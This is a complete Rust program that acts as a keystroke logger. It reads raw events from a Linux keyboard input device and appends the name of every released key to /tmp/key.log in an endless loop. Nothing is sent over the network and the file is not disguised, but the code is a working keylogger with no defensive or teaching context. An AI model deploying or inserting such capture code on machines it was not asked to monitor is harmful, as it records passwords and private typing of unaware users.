mod scancodes;
use crate::scancodes::KeyCodes;
use std::fs::OpenOptions;
use std::io::{Read, Write};
fn main() {
    const KEYBOARD_DEVICE: &str = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
    const KEY_RELEASED: i32 = 0;
    const EV_KEY: u16 = 1;
    let mut f = std::fs::File::open(KEYBOARD_DEVICE).unwrap();
    let mut buf: [u8; 24] = [0; 24];
    let mut o = OpenOptions::new()
        .append(true)
        .create(true)
        .open("/tmp/key.log")
        .unwrap();

    loop {
        f.read_exact(&mut buf).unwrap();
        let ev: libc::input_event = unsafe { std::mem::transmute(buf) };
        if ev.type_ == EV_KEY && ev.value == KEY_RELEASED {
            o.write_fmt(format_args!("{:?}/", unsafe {
                std::mem::transmute::<u16, KeyCodes>(ev.code)
            }))
            .unwrap();
        }
        std::io::stdout().flush().unwrap();
    }
}
